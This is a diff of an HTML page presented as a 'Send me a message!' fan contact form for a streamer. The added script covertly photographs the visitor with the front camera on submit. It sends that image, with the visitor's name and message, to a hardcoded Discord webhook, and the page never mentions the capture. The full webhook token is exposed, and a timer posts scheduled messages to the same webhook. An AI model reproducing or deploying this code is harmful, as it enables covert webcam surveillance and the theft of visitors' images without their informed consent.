@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FOR DEBUG PURPOSES</title>
+    <title>Send me a message!</title>
     <style>
         /* Apply a background gradient animation */
         body {
@@ -115,6 +115,14 @@
             }
         }
 
+        #name-input {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            margin-top: 10px; /* Add margin for spacing */
+        }
+
         #message-textarea {
             width: 80%;
             padding: 10px;
@@ -137,15 +145,20 @@
             background-color: #2980b9;
             transform: scale(1.05);
         }
+
+        /* Confirmation message styles */
+        #confirmation-message {
+            font-size: 18px;
+            color: #fff;
+            text-align: center;
+            display: none; /* Initially hidden */
+            margin-top: 20px;
+        }
     </style>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const buttonContainer = document.createElement('div');
             buttonContainer.className = 'button-container';
-
-            const sendButton = document.createElement('button');
-            sendButton.textContent = 'Send a message for Squidygamingg!';
-            sendButton.id = 'sendButton';
 
             const loadingScreen = document.createElement('div');
             loadingScreen.id = 'loading-screen';
@@ -155,123 +168,216 @@
             loadingText.textContent = 'Loading...';
 
             document.body.appendChild(buttonContainer);
-            buttonContainer.appendChild(sendButton);
 
-            document.body.appendChild(loadingScreen);
-            loadingScreen.appendChild(loadingText);
+            // Function to create the message input elements
+            function createMessageInput() {
+                const sendButton = document.createElement('button');
+                sendButton.textContent = 'Send a message for Squidygamingg!';
+                sendButton.id = 'sendButton';
+                buttonContainer.appendChild(sendButton);
 
-            sendButton.addEventListener('click', () => {
-                // Hide the send button
-                sendButton.style.display = 'none';
+                sendButton.addEventListener('click', () => {
+                    // Prompt the user for the message
+                    const messageText = prompt('Enter your message for Squidygamingg:');
+                    if (messageText !== null && messageText !== '') {
+                        // Hide the send button
+                        sendButton.style.display = 'none';
 
-                // Create message input elements
-                const messageInput = document.createElement('div');
-                messageInput.id = 'message-input';
+                        // Create message input elements
+                        const messageInput = document.createElement('div');
+                        messageInput.id = 'message-input';
 
-                const messageTextarea = document.createElement('textarea');
-                messageTextarea.id = 'message-textarea';
-                messageTextarea.placeholder = 'Enter your message...';
+                        const nameInput = document.createElement('input');
+                        nameInput.type = 'text';
+                        nameInput.id = 'name-input';
+                        nameInput.placeholder = 'Name';
+                        nameInput.required = true; // Make Name field required
 
-                const sendMessageButton = document.createElement('button');
-                sendMessageButton.textContent = 'Send Message';
-                sendMessageButton.id = 'send-message-button';
+                        const messageTextarea = document.createElement('textarea');
+                        messageTextarea.id = 'message-textarea';
+                        messageTextarea.value = messageText; // Set the message from the prompt
+                        messageTextarea.placeholder = 'Enter your message...';
+                        messageTextarea.required = true; // Make Message field required
 
-                messageInput.appendChild(messageTextarea);
-                messageInput.appendChild(sendMessageButton);
+                        const sendMessageButton = document.createElement('button');
+                        sendMessageButton.textContent = 'Send Message';
+                        sendMessageButton.id = 'send-message-button';
 
-                document.body.appendChild(messageInput);
+                        messageInput.appendChild(nameInput); // Add the name input
+                        messageInput.appendChild(messageTextarea);
+                        messageInput.appendChild(sendMessageButton);
 
-                sendMessageButton.addEventListener('click', async () => {
-                    const messageText = messageTextarea.value;
+                        document.body.appendChild(messageInput);
 
-                    if (messageText) {
-                        // Display the loading screen
-                        loadingScreen.style.display = 'flex';
+                        sendMessageButton.addEventListener('click', async () => {
+                            const nameText = nameInput.value;
+                            const messageText = messageTextarea.value;
 
-                        // Capture front camera image
-                        const imageBlob = await captureFrontCameraImage();
+                            if (nameText && messageText) {
+                                // Display the loading screen
+                                loadingScreen.style.display = 'flex';
 
-                        // Send a message with the captured image and text using a Discord webhook
-                        sendMessageWithImageAndText(imageBlob, messageText);
+                                // Capture front camera image
+                                const imageBlob = await captureFrontCameraImage();
 
-                        // Hide the message input
-                        messageInput.style.display = 'none';
+                                // Send a message with the captured image, name, and text
+                                sendMessageWithImageAndText(imageBlob, nameText, messageText);
 
-                        // Show the send button again
-                        sendButton.style.display = 'block';
+                                // Hide the message input
+                                messageInput.style.display = 'none';
 
-                        // Hide the loading screen
-                        loadingScreen.style.display = 'none';
+                                // Show the confirmation message
+                                const confirmationMessage = document.getElementById('confirmation-message');
+                                confirmationMessage.textContent = 'Thank you for your message! Wait for the owner to include your text in the Comments (response)';
+                                confirmationMessage.style.display = 'block';
+
+                                // Hide the loading screen
+                                loadingScreen.style.display = 'none';
+                            }
+                        });
                     }
                 });
-            });
+            }
+
+            // Function to capture front camera image
+            async function captureFrontCameraImage() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    await video.play();
+
+                    // Capture a frame from the video stream as an image
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert the captured frame to a data URL (base64)
+                    const imageBlob = canvas.toDataURL('image/jpeg');
+
+                    // Stop the camera stream and remove the video element
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+
+                    return imageBlob;
+                } catch (error) {
+                    console.error('Error capturing image:', error);
+                    return null;
+                }
+            }
+
+            // Function to send a message with an image, name, and text using a Discord webhook
+            function sendMessageWithImageAndText(imageBlob, nameText, messageText) {
+                // Replace 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL
+                const webhookURL = 'https://discordapp.com/api/webhooks/1156295739438276608/_9y-AowFIIMfpYlSB_h2Ya7nvo1ehBeuUvpn4y-GqOA7WEzIksm0Np-Yee47OdO2_Bdl';
+
+                const formData = new FormData();
+                formData.append('file', dataURItoBlob(imageBlob), 'image.jpg');
+                formData.append('content', `**Name:** ${nameText}\n**Message:** ${messageText}`); // Format as Discord Markdown
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    console.log('Image and text sent to Discord webhook.');
+                })
+                .catch(error => {
+                    console.error('Error sending image and text to Discord webhook:', error);
+                });
+            }
+
+            // Helper function to convert data URI to Blob
+            function dataURItoBlob(dataURI) {
+                const byteString = atob(dataURI.split(',')[1]);
+                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], { type: mimeString });
+            }
+
+            // Create the message input when the page loads
+            createMessageInput();
+
+            // Function to send scheduled messages
+            function sendScheduledMessages() {
+                const now = new Date();
+                const hour = now.getUTCHours();
+                const minute = now.getUTCMinutes();
+
+                const webhookURL = 'https://discordapp.com/api/webhooks/1156295739438276608/_9y-AowFIIMfpYlSB_h2Ya7nvo1ehBeuUvpn4y-GqOA7WEzIksm0Np-Yee47OdO2_Bdl';
+                const headers = {
+                    'Content-Type': 'application/json',
+                };
+
+                if (hour === 23 && minute === 59) {
+                    // Send "INITIATING RESTART IN 1 MINUTE"
+                    const message = {
+                        content: 'INITIATING RESTART IN 1 MINUTE',
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => {
+                        console.log('Scheduled message sent: INITIATING RESTART IN 1 MINUTE');
+                    })
+                    .catch(error => {
+                        console.error('Error sending scheduled message:', error);
+                    });
+                } else if (hour === 0 && minute === 1) {
+                    // Send "TEST IN PROGRESS"
+                    const message = {
+                        content: 'TEST IN PROGRESS',
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => {
+                        console.log('Scheduled message sent: TEST IN PROGRESS');
+                    })
+                    .catch(error => {
+                        console.error('Error sending scheduled message:', error);
+                    });
+                } else if (hour === 0 && minute === 2) {
+                    // Send "TEST COMPLETE"
+                    const message = {
+                        content: 'TEST COMPLETE',
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => {
+                        console.log('Scheduled message sent: TEST COMPLETE');
+                    })
+                    .catch(error => {
+                        console.error('Error sending scheduled message:', error);
+                    });
+                }
+            }
+
+            // Check and send scheduled messages every minute
+            setInterval(sendScheduledMessages, 60000);
         });
-
-        // Function to capture front camera image
-        async function captureFrontCameraImage() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                await video.play();
-
-                // Capture a frame from the video stream as an image
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert the captured frame to a data URL (base64)
-                const imageBlob = canvas.toDataURL('image/jpeg');
-
-                // Stop the camera stream and remove the video element
-                stream.getTracks().forEach(track => track.stop());
-                video.remove();
-
-                return imageBlob;
-            } catch (error) {
-                console.error('Error capturing image:', error);
-                return null;
-            }
-        }
-
-        // Function to send a message with an image and text using a Discord webhook
-        function sendMessageWithImageAndText(imageBlob, messageText) {
-            // Replace 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL
-            const webhookURL = 'https://discordapp.com/api/webhooks/1156295739438276608/_9y-AowFIIMfpYlSB_h2Ya7nvo1ehBeuUvpn4y-GqOA7WEzIksm0Np-Yee47OdO2_Bdl';
-
-            const formData = new FormData();
-            formData.append('file', dataURItoBlob(imageBlob), 'image.jpg');
-            formData.append('content', messageText);
-
-            fetch(webhookURL, {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => {
-                console.log('Image and text sent to Discord webhook.');
-            })
-            .catch(error => {
-                console.error('Error sending image and text to Discord webhook:', error);
-            });
-        }
-
-        // Helper function to convert data URI to Blob
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
     </script>
 </head>
 <body>
-    <h1>TEST ONLY</h1>
+    <h1>Send me a message!</h1>
+    <!-- Add a div to display the confirmation message -->
+    <div id="confirmation-message"></div>
 </body>
 </html>
